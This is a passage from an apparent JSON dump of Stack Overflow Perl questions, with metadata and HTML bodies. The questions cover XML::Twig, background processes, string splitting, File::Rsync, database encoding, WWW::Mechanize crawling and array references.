twig_handlers =&gt; {\n        'book-id'       =&gt; sub { $_-&gt;set_text('&lt;?sample?&gt;') },\n        keep_atts_order =&gt; 1,\n    },\n    pretty_print =&gt; 'indented',\n);\n\n$story_file-&gt;parsefile('sample.xml');\n$story_file-&gt;print($out);\n</code></pre>\n\n<p>Output:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;book&gt;\n  &lt;book-meta&gt;\n    &lt;book-id pub-id-type=\"doi\"&gt;&amp;lt;?sample?&gt;&lt;/book-id&gt;\n      &lt;book-title&gt;Regenerating &lt;?tex?&gt; the Curriculum&lt;/book-title&gt;\n  &lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>I would like output as:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;book&gt;\n      &lt;book-meta&gt;\n        &lt;book-id pub-id-type=\"doi\"&gt;&lt;?sample?&gt;&lt;/book-id&gt;\n          &lt;book-title&gt;Regenerating &lt;?tex?&gt; the Curriculum&lt;/book-title&gt;\n      &lt;/book-meta&gt;\n    &lt;/book&gt;\n</code></pre>\n\n<p>How can I escape this type of character in XML twig. I tried the <code>set_asis</code> option, but I can't get it to work.</p>\n"},{"tags":["perl","unix","command-line"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13157666,"title":"Running a background process in perl","body":"<p>I have a process which when<br>\nexecuted as below:</p>\n\n<pre><code>process_name &gt; file.txt\n</code></pre>\n\n<p>will redirect all the output to file.txt and also to the console.</p>\n\n<p>when executed like this</p>\n\n<pre><code>process_name &gt;&amp; file.txt&amp;\n</code></pre>\n\n<p>will redirect the output to file.txt but <strong>will not print the output to console</strong> returning the pid on the console.</p>\n\n<p>Now i want to execute the second way of running the process inside a perl script!\nhow could i do this?\ncurrently i am usng the below method:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $res = `bsm_adjust_controller -F -ra -d 'subnetwork=NETSim_STD/bsc=0005' -f /tmp/31102012/Task_31102012_1421_0005.log &gt;&amp; /tmp/31102012/Ctrl_31102012_1421_0005.log&amp;`;\nprint $res;\n</code></pre>\n\n<p>when i run the script it gives:</p>\n\n<pre><code> ./temp.pl\nsh: /tmp/31102012/Ctrl_31102012_1421_0005.log: bad number\n</code></pre>\n\n<p>I also tried the below method:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $res = \"bsm_adjust_controller -F -ra -d 'subnetwork=NETSim_STD/bsc=0005' -f /tmp/31102012/Task_31102012_1421_0005.log &gt;&amp; /tmp/31102012/Ctrl_31102012_1421_0005.log&amp;\";\n\nopen(CMD, '-|', $res) || die \"couldn't run $res: $!\\n\";\n</code></pre>\n\n<p>Even the above script throws the same error.\nthe purpose is to execute the process in background and continue with the next statements without caring what happened to the process and also i donot need the output of the process being run inside to console.</p>\n\n<p>could anybody please help?</p>\n"},{"tags":["perl","logging","line-numbers","mojolicious"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":27,"score":1,"question_id":13175293,"title":"Mojo::Log - Is it possible to add the line number to the messages?","body":"<p>Is it possible to configure <a href=\"http://search.cpan.org/perldoc?Mojo%3A%3ALog\" rel=\"nofollow\">Mojo::Log</a> in a way so it adds the line number to the log messages?</p>\n"},{"tags":["arrays","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13175086,"title":"How to identify a variable whether it belongs to one array or another in perl","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2860226/how-can-i-check-if-a-perl-array-contains-a-particular-value\">How can I check if a Perl array contains a particular value?</a>  </p>\n</blockquote>\n\n\n\n<p>I have two arrays <code>@array1 = (1..26);</code>, <code>@array2 = ('a'..'z');</code> and a variable <code>$x</code>. suppose <code>$x=5</code> then how can I compare this value with two arrays and state in output that this variable belongs to <code>@array1</code>?</p>\n"},{"tags":["perl","split","char","repeated"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13175299,"title":"perl split string on a single char, not on repeated char","body":"<p>I am using an existing perl script to process a text file output from a database query which I have no control over.</p>\n\n<p>The data contains fields separated by '|', but some fields contain '||'. There are no empty fields. There may be spaces on either side of the field separator which I would also like to remove.</p>\n\n<p>I cannot find a simple way to achieve this, apart from changing the '||' to something else, and putting it hack after the split, which seems a bit heavy going.</p>\n\n<p>The file is substantial (typically up to about 100M).</p>\n\n<p>Using <code>split(/ *\\| */, $line)</code> works apart from the '||' character.</p>\n\n<p>Any thought please?</p>\n"},{"tags":["perl","file-exists","copyfile"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13174939,"title":"Perl â create numbered backup copy of a file","body":"<p>I'm extracting data to some text file but first I want my script to check if file exists, then create copy in a certain folder. If it still exists in the same folder, save it but append like a value _1 or _2 ... depending on the value of the last file.</p>\n\n<p>Here is my script currently, </p>\n\n<pre><code>if (-e \"/tmp/POP_Airtime_Week1.txt\"){\n\n    copy(\"/tmp/POP_Airtime_Week1.txt\",\"/tmp/POP\") || die \"cannot copy file\";\n    # If the file exists create a copy in /tmp/POP\n\n    #################################\n    # IF FILE EXISTS IN /tmp/POP copy the file but rename it to \n    # POP_Airtime_Week1_1.txt then increase the numbers each time\n    # the script is run and a new copy needs to be created.\n    ##################################\n\n    unlink (\"/tmp/POP_Airtime_Week1.txt\");\n\n}\n</code></pre>\n\n<p>If <code>/tmp/POP/POP_Airtime_Week1.txt</code> exists, then copy it but save it as <code>/tmp/POP/POP_Airtime_Week1_1.txt</code>. The next time I run the script and <code>/tmp/POP/POP_Airtime_Week1.txt</code> exists, copy it and save it as <code>/tmp/POP/POP_Airtime_Week1_2.txt</code>  etc...</p>\n\n<p>How can I do this?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13174427,"title":"rewrite map code without using map","body":"<p>I am working on a perl script which calls VMware vSphere perl API. I was facing few problems and while googling, I found a solution which seems to work for me. However, one of the important piece of the code is written with <code>map</code>. Credit goes to the VMware community member who wrote it. Here is the code:</p>\n\n<pre><code>$datastore_map = map { $_-&gt;{'mo_ref'}-&gt;{'value'} =&gt; $_  } @{$datastore_views || [ ]};\n</code></pre>\n\n<p>I am not able to understand what above line is doing. </p>\n\n<p>So, Could you help me to convert above line into a foreach loop or something similar. Believing in TMTOWTDI, there has to be another way to write same logic.</p>\n\n<p>I tried to learn the <code>map</code> function a lot of times but it always bounces off my head. Hence I want to implement above logic without using the <code>map</code> function.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>After reading the answers, I think the it should be <code>%datastore_map</code> and not <code>$datastore_map</code>. Because the next line of the code is <code>$datastore = $datastore_map-&gt;{$moref-&gt;{'value'}};</code></p>\n\n<p>It has to be a typo.</p>\n\n<p>I will accept the answer when stacoverflow allows me to. Thanks for the quick repsonces. I spend almost an hour trying to understand it and failed at it.</p>\n\n<p>Thanks.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Thanks @nickisfat, @choroba and @ikegami for the responses. All the answers are correct but I can accept only one. So I will go with the one which was posted first in the chronological order. Thanks again for the answers.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13172556,"title":"use commet to some tags in a xml file","body":"<p>I read now a xml file, I did particular tag comment but It omitted and then insert comment...</p>\n\n<p>XML:</p>\n\n<pre><code>&lt;book&gt;\n  &lt;book-meta&gt;\n    &lt;book-id pub-id-type=\"doi\"&gt;1545&lt;/book-id&gt;\n&lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>script: </p>\n\n<pre><code> use strict;\nuse XML::Twig;\nopen(my $out, '&gt;', 'Output.xml') or die \"can't Create stroy file $!\\n\";\n\nmy $story_file = XML::Twig-&gt;new(\n                               twig_handlers =&gt;{\n                                        'book-id' =&gt; sub {$_-&gt;set_comment('drop')},\n                                        keep_atts_order =&gt; 1,\n                                        },\n                                        pretty_print =&gt; 'indented',\n                              );\n\n$story_file-&gt;parsefile('sample.xml');\n$story_file-&gt;print($out);\n</code></pre>\n\n<p>my output is:</p>\n\n<pre><code>&lt;book&gt;\n  &lt;book-meta&gt;&lt;!--drop--&gt;\n  &lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>i need out as:</p>\n\n<pre><code>&lt;book&gt;\n  &lt;book-meta&gt;\n    &lt;!--&lt;book-id pub-id-type=\"doi\"&gt;1545&lt;/book-id&gt;--&gt;\n&lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>what I wrong in this process.... </p>\n"},{"tags":["perl","rsync"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13171072,"title":"How to get the amount of data transfered with Perl File::Rsync","body":"<p>I used to tar ball and SFTP my backups but they are growing to large and I'm needlessly transferring data I already have a copy of so decided to update my code to utilize rsync via <a href=\"http://search.cpan.org/~leakin/File-Rsync-0.42/Rsync.pm\" rel=\"nofollow\">File::Rsync</a> and it's delta algorithm. I can successfully transfer the data as required but I can't seem to find a way to record the amount of data that was transferred. Previously I could stat the generated tar but since I'm not likely moving all files in the source directory how can I know the amount moved?</p>\n\n<p>The destination parent directory may not exist so it is created (mkdir -p /path/to/create) via Net::SSH::Perl, point being I can run cmds against the destination before or after rsync.</p>\n\n<p>I will include my code, I doubt it's actually useful but if I don't someone will just ask for it anyway. Suggestions anyone?</p>\n\n<pre><code>use File::Rsync;\n\n$obj = File::Rsync-&gt;new( { verbose =&gt; 1,\n                           archive =&gt; 1,\n                          compress =&gt; 1,\n                         recursive =&gt; 1,\n                               rsh =&gt; '/usr/bin/ssh -i /user/.ssh/id_rsa',\n                            delete =&gt; 1,\n                      'rsync-path' =&gt; '/usr/bin/rsync'\n\n       } );\n\n$obj-&gt;exec( { src =&gt; \"$backupwhat\",\n             dest =&gt; \"host.co.uk:/remote_backup/$backupto\"\n             } ) or warn \"rsync failed\\n\"; \n</code></pre>\n"},{"tags":["sql","perl","binary","rdbms","sqldatatypes"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":13161674,"title":"SQL databases: could there be something else than valid unicode strings when reading columns with text data types?","body":"<p>Edited title and added this text:</p>\n\n<p>SQL databases (except SQLite): Could there be something else than valid unicode strings when reading columns with text data types and connected to the database with the right options?\nWith SQLite it is not enough to filter out BLOB columns to avoid binary data. Now I am wondering if with other SQL databases it is enough to filter out columns with binary data-types to avoid binary data in the output.</p>\n\n<pre><code>#!/usr/bin/env perl\nuse warnings;\nuse 5.10.1;\nuse utf8;\nuse DBI;\n\nmy $binary = '1001001000101000110110100100010000010101100110101101011010100010000000001010101000111111';\n$binary = pack( 'b*', $binary );\nmy $data = [\n    [ 'abcdefghi', $binary ],\n    [ $binary, 'abcdefghi'  ],\n];\n\nmy $db = 'my_test_data_base';\nmy $table = 'TEST_TABLE';\n\n\n$dbh = DBI-&gt;connect( \"DBI:mysql:dbname=$db\", ... ) or die DBI-&gt;errstr;\n$dbh-&gt;{mysql_enable_utf8} = 1;\n$dbh-&gt;do( \"CREATE TABLE IF NOT EXISTS $table (\nText    VARCHAR(30),\nBnry    VARBINARY(30)\n)\" );\n\nmy $sth = $dbh-&gt;prepare( \"INSERT INTO $table ( Text, Bnry ) VALUES ( ?, ? )\" );\nfor my $row ( @$data ) {\n    $sth-&gt;execute( @$row );\n}\n\n$sth = $dbh-&gt;prepare( \"SELECT * FROM $table\" );\n$sth-&gt;execute();\nmy $ref = $sth-&gt;fetchall_arrayref();\nsay \"MySQL:\";\nfor my $row ( @$ref ) {\n    say '&lt;', join( '&gt;, &lt;', @$row ), '&gt;';\n}\nsay \"\";\n\n\n$dbh = DBI-&gt;connect( \"DBI:SQLite:dbname=$db\", ... ) or DBI-&gt;errstr;\n$dbh-&gt;{sqlite_unicode} = 1;\n$dbh-&gt;do( \"CREATE TABLE IF NOT EXISTS $table (\nText    TEXT,\nBnry    BLOB\n)\" );\n\n$sth = $dbh-&gt;prepare( \"INSERT INTO $table ( Text, Bnry ) VALUES ( ?, ? )\" );\nfor my $row ( @$data ) {\n    $sth-&gt;execute( @$row );\n}\n\n$sth = $dbh-&gt;prepare( \"SELECT * FROM $table\" );\n$sth-&gt;execute();\n$ref = $sth-&gt;fetchall_arrayref();\nsay \"SQLite:\";\nfor my $row ( @$ref ) {\n    say '&lt;', join( '&gt;, &lt;', @$row ), '&gt;';\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>MySQL:\n&lt;abcdefghi&gt;, &lt;I[\"ï¿½YkEUï¿½&gt;\n&lt;I[\"&gt;, &lt;abcdefghi&gt;\n\nSQLite:\n&lt;abcdefghi&gt;, &lt;I[\"ï¿½YkEUï¿½&gt;\n&lt;I[\"ï¿½YkEUï¿½&gt;, &lt;abcdefghi&gt;\n</code></pre>\n\n<p>With MySQL it looks like it prints (or stores) binary data in text data-type columns until the first invalid code. Is this specific MySQL or behaves every SQL database engine other than SQLite like this?</p>\n"},{"tags":["perl","table","file-io","pattern-matching"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":13171037,"title":"How can I convert this output in this table format with Perl?","body":"<p>I have this output data:</p>\n\n<pre><code>10dvex1_miRNA_ce.out.data|3331\n10dvex1_misc_RNA_ce.out.data|0\n10dvex1_rRNA_ce.out.data|60\n10dvex1_snoRNA_ce.out.data|895\n10dvex1_snRNA_ce.out.data|2127\n11dvex1_miRNA_ce.out.data|3367\n11dvex1_misc_RNA_ce.out.data|0\n11dvex1_rRNA_ce.out.data|54\n11dvex1_snoRNA_ce.out.data|839\n11dvex1_snRNA_ce.out.data|1770\n12dvex1_miRNA_ce.out.data|3321\n12dvex1_misc_RNA_ce.out.data|0\n12dvex1_rRNA_ce.out.data|50\n12dvex1_snoRNA_ce.out.data|854\n12dvex1_snRNA_ce.out.data|1821\n</code></pre>\n\n<p>I want to convert this output in this format, like as table:</p>\n\n<pre><code>`Fragment \\t miRNA \\t misc_RNA \\t rRNA \\t snRNA \\t snoRNA`\n 10 \\t 3331 \\t 0 \\t 60 \\t 2127 \\ 895 \\n\n 11 \\t 3367 \\t 0 \\t 54 \\t 1770 \\t 839 \\n\n 12 \\t 3321 \\t 0 \\t 50 \\t 1821 \\t 854 \\n\n</code></pre>\n\n<p>I need to use this table as Input to R. Some ideas? I try with perl with this script, but the result arenÂ´t good:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\n\nopen(MYINPUTFILE, $ARGV[0]); # open for input\nmy @lines = &lt;MYINPUTFILE&gt;; # read file into list\nprint \"Frag\".\"\\t\".\"miRNA\".\"\\t\".\"misc_RNA\".\"\\t\".\"rRNA\".\"\\t\".\"snRNA\".\"\\t\".\"snoRNA\".\"\\n\";\nforeach my $lines (@lines){\n    my $pattern = $lines;\n    $pattern =~ s/(.*)dvex\\d_(.*)_(.*)\\|(.*)/$1 $2  $4/g;\n    print $1.\"\\t\".$4;\n}\nclose(MYINPUTFILE);\nexit;\n</code></pre>\n\n<p>And the result:</p>\n\n<pre><code>Frag    miRNA   misc_RNA    rRNA    snRNA   snoRNA\n10  333110  010 6010    89510   212711  336711  011 5411    83911   177012  332112  012 5012\n</code></pre>\n\n<p>Isn't the idea.       </p>\n"},{"tags":["perl","web-crawler","spider","www-mechanize"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":13166614,"title":"Perl mechanize Find all links array loop issue","body":"<p>I am currently attempting to create a <strong>Perl webspider using WWW::Mechanize.</strong></p>\n\n<p>What I am trying to do is <strong>create a webspider that will crawl the whole site</strong> of the URL (entered by the user) and extract all of the links from every page on the site.</p>\n\n<p><strong>But I have a problem with how to spider the whole site to get every link, without duplicates</strong>\nWhat I have done so far (the part im having trouble with anyway):</p>\n\n<pre><code>foreach (@nonduplicates) {   #array contain urls like www.tree.com/contact-us, www.tree.com/varieties....\n$mech-&gt;get($_);\nmy @list = $mech-&gt;find_all_links(url_abs_regex =&gt; qr/^\\Q$urlToSpider\\E/);  #find all links on this page that starts with http://www.tree.com\n\n#NOW THIS IS WHAT I WANT IT TO DO AFTER THE ABOVE (IN PSEUDOCODE), BUT CANT GET WORKING\n#foreach (@list) {\n#if $_ is already in @nonduplicates\n#then do nothing because that link has already been found\n#} else {\n#append the link to the end of @nonduplicates so that if it has not been crawled for links already, it will be \n</code></pre>\n\n<p><strong>How would I be able to do the above?</strong></p>\n\n<p><strong>I am doing this to try and spider the whole site to get a comprehensive list of every URL on the site, without duplicates.</strong></p>\n\n<p>If you think this is not the best/easiest method of achieving the same result I'm open to ideas.</p>\n\n<p><strong>Your help is much appreciated, thanks.</strong> </p>\n"},{"tags":["perl","https","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":13170478,"title":"Perl Mechanize bypass cert verification but encounters auth/login","body":"<p>im working within my company network and developing a new module for their systems. However, they have invalidated all ssl certificates thus i had to bypass the certificate verification.</p>\n\n<p>Using mechanize's function to ignore ssl,</p>\n\n<pre><code>my $mech = WWW::Mechanize-&gt;new(\nssl_opts =&gt; {\n    verify_hostname =&gt; 0,\n},\n</code></pre>\n\n<p>I was able to bypass the certificate verification, however I encounter the following error\n<code>Error GETing https://192.168.100.82/login;jsessionid=legizzgnfjd6g73szziuhboc: Could not resolve view with name 'auth/login' in servlet with name 'mvc'</code>.</p>\n\n<p>I do not understand whether it is it because of the unaccepted certificate that i am not able to access the https site or is it something that i had done wrong. Please help me understand what is going wrong.</p>\n\n<p>the site that i am connecting to is a module's website within the company network</p>\n\n<p>Here is the running of my code after initializing mechanize to ignore ssl.</p>\n\n<pre><code>my $url = 'https://192.168.100.82';\n$mech-&gt;get( $url );\ndie $mech-&gt;response-&gt;status_line unless $mech-&gt;success;\n</code></pre>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13172141,"title":"not able to install Text::Bidi CPAN module","body":"<p>Trying to install <a href=\"http://search.cpan.org/perldoc?Text%3a%3aBidi\" rel=\"nofollow\">Text::Bidi</a> CPAN module, but failed. \nGetting this <a href=\"http://www.dinkypage.com/errortextbidi\" rel=\"nofollow\">error</a>. Do anybody know any work around for this?</p>\n\n<pre><code>OS : Ubuntu 10.04\n</code></pre>\n"},{"tags":["perl","apache","firefox","cgi"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":13168077,"title":"How can I download a perl script from a CGI server instead of running it?","body":"<p>I am trying to download the perl scripts from this site:\n<a href=\"http://pages.cs.wisc.edu/~david/courses/cs552/S12/handouts/bins/\" rel=\"nofollow\">http://pages.cs.wisc.edu/~david/courses/cs552/S12/handouts/bins/</a></p>\n\n<p>When I open or download any of them, the scripts execute. However, I want the text in the scripts. Is there any way I can do this?</p>\n"},{"tags":["perl","sublimetext2","activeperl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12789975,"title":"Setting up sublime text 2 with activeperl?","body":"<p>New to using sublime text 2 and I'm wondering how to get it to point to the activeperl.exe (on win7).</p>\n\n<p>I'm testing out the compiler to make sure it works with something simple like:</p>\n\n<pre><code>$x = 1;\n$print \"$x\";\n</code></pre>\n\n<p>But it gives me guff about how $x isn't a recognized syntax. I did point ST2 to my python executable, but I forgot which file in the labyrinth I was supposed to edit the path to.</p>\n"},{"tags":["perl","bash","unix","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":13161963,"title":"File comparison with multiple columns","body":"<p>I am doing a directory cleanup to check for files that are not being used in our testing environment.  I have a list of all the file names which are sorted alphabetically in a text file and another file I want to compare against.</p>\n\n<p>Here is how the first file is setup:</p>\n\n<pre><code>test1.pl\ntest2.pl\ntest3.pl\n</code></pre>\n\n<p>It is a simple, one script name per line text file of all the scripts in the directory I want to clean up based on the other file below.</p>\n\n<p>The file I want to compare against is a tab file which lists a script that each server runs as a test and there are obviously many duplicates.  I want to strip out the testing script names from this file and compare spit it out to another file, use <code>uniq</code> and <code>sort</code> so that I can <code>diff</code> this file with the above to see which testing scripts are not being used. </p>\n\n<p>The file is setup as such:</p>\n\n<pre><code>server: : test1.pl test2.pl test3.pl test4.sh test5.sh\n</code></pre>\n\n<p>There are some lines with less and some with more.  My first impulse was to make a <code>Perl</code> script to split the line and push the values in an list if they are not there but that seems wholly inefficient.  I am not to experienced in <code>awk</code> but I figured there is more than one way to do it.  Any other ideas to compare these files?</p>\n"},{"tags":["perl","error-handling"],"answer_count":5,"favorite_count":7,"up_vote_count":10,"down_vote_count":0,"view_count":850,"score":10,"question_id":2869297,"title":"What are the best practices for error handling in Perl?","body":"<p>I'm learning Perl, and in a lot of the examples I see errors are handled like this</p>\n\n<pre><code>open FILE, \"file.txt\" or die $!;\n</code></pre>\n\n<p>Is <code>die</code> in the middle of a script really the best way to deal with an error?</p>\n"},{"tags":["perl","shell","performance","benchmarking"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1423,"score":5,"question_id":2703938,"title":"Is it possible to write a shell script which is faster than the equivalent script in Perl?","body":"<p>I wrote multiple scripts in Perl and shell and I have compared the real execution time. In all the cases, the Perl script was more than 10 times faster than the shell script.</p>\n\n<p>So I wondered if it possible to write a shell script which is faster than the same script in Perl? And why is Perl faster than shell although I use the <a href=\"http://perldoc.perl.org/functions/system.html\" rel=\"nofollow\">system</a> function in Perl script?</p>\n"},{"tags":["sql","perl","postgresql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13167778,"title":"returning errors back to user after insert/update","body":"<p>I'm trying to find a good way to return error messages from postgresql back to my client-side application. I've read about RAISE, which appears to be what I want, but I have couple questions. Using Postgresql 9.1.</p>\n\n<p>An overview of what's going on, I'm receiving a JSON object from the client, parse the JSON into a Perl Hash, loop through the keys and do an update/insert on each iteration. The hash keys correlate with the my database table names.</p>\n\n<p>I have 3 sql functions like this (all the same name). One accepts text,timestamp with timezone, and an integer. (query used from <a href=\"http://stackoverflow.com/a/6527838/722238\">http://stackoverflow.com/a/6527838/722238</a>) </p>\n\n<pre><code>-- $1 = Table Key, $2 = Table Value, $3 = Table Name.\ncreate function ex.foo(integer,text,text) Arg2 could be timestamp,text,or integer.  \n    returns void as $$\n    begin\n    execute format('update %3$s set v= %2$L where k = %1$L;\n                insert into %3$s (k,v) select %1$s, %2$L \n                  where not exists (select 1 from %3$s where k = %1$L)', $1,$2,$3);\n    -- RAISE a descriptive error. \n    return;\n    end;\n$$ language 'plpgsql';\n</code></pre>\n\n<p>At the moment, I'm doing this (pseudo-ish code):</p>\n\n<pre><code>if (Begin) {\n    eval {\n        my $tk = 123;\n        foreach my $k (keys %js) {\n            ## tk = table key, $k = table name, $js{$k} = value \n            executeq(\"select ex.foo(tk,$js{$k},$k);\") or die error(pgError); # Function to handle error?\n         }\n         Commit;\n     };\n     if ($@) {\n         RollBack;\n         ## Return $@ \n     }\n}\n</code></pre>\n\n<p>My problem is, I'm not sure how I should generate a descriptive error (where/why), return it up the chain and in language the user can understand. Again, how should I raise the error, and should it be passed to an error handler function? What is the standard? How do others achieve this? </p>\n\n<p>Also, are there issues I may run into while looping through my hash and insert/updating values like this?</p>\n"},{"tags":["php","regex","perl","translation"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":113,"score":2,"question_id":13164325,"title":"What is the PHP equivalent of this perl regular expression","body":"<p>How can I write this perl code using PHP?</p>\n\n<pre><code>$var =~ tr/[A-Za-z,.]/[\\000-\\077]/;\n</code></pre>\n\n<p>edit 007 should have been 077</p>\n"},{"tags":["mysql","multithreading","perl","fork","message-queue"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":13162235,"title":"To fork or not to fork?","body":"<p>I am re-developing a system that will send messages via http to one of a number of suppliers. The original is perl scripts and it's likely that the re-development will also use perl.</p>\n\n<p>In the old system, there were a number of perl scripts all running at the same time, five for each supplier. When a message was put into the database, a random thread number (1-5) and the supplier was chosen to ensure that no message was processed twice while avoiding having to lock the table/row. Additionally there was a \"Fair Queue Position\" field in the database to ensure that a large message send didn't delay small sends that happened while the large one was being sent.</p>\n\n<p>At some times there would be just a couple of messages per minute, but at other times there would be a dump of potentially hundreds of thousands of messages. It seems to me like a resource waste to have all the scripts running and checking for messages all of the time so I am trying to work out if there is a better way to do it, or if the old way is acceptable.</p>\n\n<p>My thoughts right now lie with the idea of having one script that runs and forks as many child processes as are needed (up to a limit) depending on how much traffic there is, but I am not sure how best to implement it such that each message is processed only once, while the fair queuing is maintained.</p>\n\n<p>My best guess right now is that the parent script updates the DB to indicate which child process should handle it, however I am concerned that this will end up being less efficient than the original method. I have little experience of writing forking code (last time I did it was about 15 years ago).</p>\n\n<p>Any thoughts or links to guides on how best to process message queues appreciated!</p>\n"},{"tags":["mysql","perl","extended-ascii"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":13150392,"title":"Extended ASCII characters show up as junk in MySQL db is inserted through perl","body":"<p>I have a MySQL 'articles' table and I am trying to make the following insert using SQLyog.</p>\n\n<pre><code>insert into articles (id,title) values (2356606,'JÃ©rÃ´me_Lejeune');\n</code></pre>\n\n<p>This works fine and the data shows fine when I do a select query.</p>\n\n<p>The problem is that when I do the same insert query through my perl script, the name shows up with some junk characters in place of Ã© and Ã´ in the database. I need to know how to properly store the name through my script. The part of code that does the insert is like this.</p>\n\n<pre><code>$sql_insert = \"insert into articles (id,title) values (?,?)\";\n$sth_insert = $dbh-&gt;prepare($sql_insert);\n$sth_insert-&gt;execute($id,$title);\n</code></pre>\n\n<p>$id and $title have the correct required data which I have checked by print before I am inserting them. Please assist.</p>\n"},{"tags":["multithreading","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":6553598,"title":"Load modules in Perl at run time and share it between threads","body":"<p>Is it possible to load modules at run time, <code>require '/file_path/file_name.pm';</code> , and share the memory between threads?</p>\n\n<p>Basically, I have a pool of threads, if thread#1 decides to load a module, I want the module available to all the threads!  </p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":13156269,"title":"Using a reference to an anonymous array as an element of an array","body":"<p>I am trying to use a reference to an array in various ways that I understand can be done. <br />\nHere's one of my trial: -</p>\n\n<pre><code>my $RoR = [[2, 3], [4, 5, 7]];\nmy @AoA = ([2, 3], [[2, 3], [4, 5, 7]]);\nmy @AwR = ([2, 3], @{$RoR});\n\nprint $AoA[1][1][1], \"\\n\";      # 1\nprint $AoA[1]-&gt;[1][1], \"\\n\";    # 2\n\n#print $RoR[0][1], \"\\n\";        # 3\nprint $RoR-&gt;[0][1], \"\\n\";       # 4\n\nprint $AwR[1][1][1], \"\\n\";          # 5\nprint $AwR[1]-&gt;[1][1], \"\\n\";        # 6\n</code></pre>\n\n<p>As you can see, I have three different arrays.</p>\n\n<ul>\n<li><p><code>$RoR</code> -> Is a reference to an anonymous array, which contains two anonymous arrays</p></li>\n<li><p><code>@AoA</code> -> Is an array containing 2 anonymous array. 2nd anonymous array is same as the array pointed to by the reference <code>$RoR</code></p></li>\n<li><p><code>@AwR</code> -> Is almost same as <code>@AoA</code>, but with a difference that, rather than having a new anonymous array, I have added the reference <code>@{$RoR}</code> itself, inside it. So, basically I think, the last two arrays are practically the same.</p></li>\n</ul>\n\n<p>Now, the problem is, <strong>they are not behaving in the same way</strong>. </p>\n\n<ul>\n<li><p>The print statements <code>1</code>, and <code>2</code> are working fine, and printing out the value <code>5</code> as result.</p></li>\n<li><p>The print statement <code>3</code> is giving error, which I know why, so no problem in it. The print statement <code>4</code> is printing the value <code>3</code>, as expected.</p></li>\n<li><p>Now, the print statement <code>5</code> and <code>6</code> are throwing some errors when I try to run the program.</p>\n\n<pre><code>\"Can't use string (\"2\") as an ARRAY ref while \\\"strict refs\\\" in use at \nD:/_Perl Practice/3perldsc/array_of_array.pl line 15.\"\n</code></pre></li>\n</ul>\n\n<p>Then I tried using: -</p>\n\n<pre><code>print $AwR[1][1]-&gt;[1], \"\\n\";    \nprint @{$RoR}[1]-&gt;[1];\n</code></pre>\n\n<p>Where, I replaced <code>$AwR[1]</code> with <code>@{$RoR}</code>, as <code>$AwR[1]</code> contains <code>@{$RoR}</code>. The second one is working fine, while the first one is still throwing error.</p>\n\n<p>So, what exactly is the difference between the <code>1st two</code> and the <code>last two</code> print statements? I thought they are the same, and hence should give same result for same index access. But it is not. Am I using the reference in some wrong way?</p>\n\n<hr>\n\n<p>Ok, now above doubt is clear. So, I have posted an answer accumulating the general stuff related to this question. Please take a look at it below.  In that, I have a doubt in the <code>5th and 6th</code> print statement, and to understand it I tried the below test: -</p>\n\n<pre><code>print $AwR[1][1];   # Allowed as `$AwR[1]` is same as `$$RoR`.\nprint $$RoR[1];     # Allowed as in 3(b)\nprint $AwR[1]-&gt;[1]; # Confused here. It is allowed\nprint $$RoR-&gt;[1];   # But this is not.\n</code></pre>\n\n<p>The first three statement are printing the same <code>reference value</code>. But the last one is 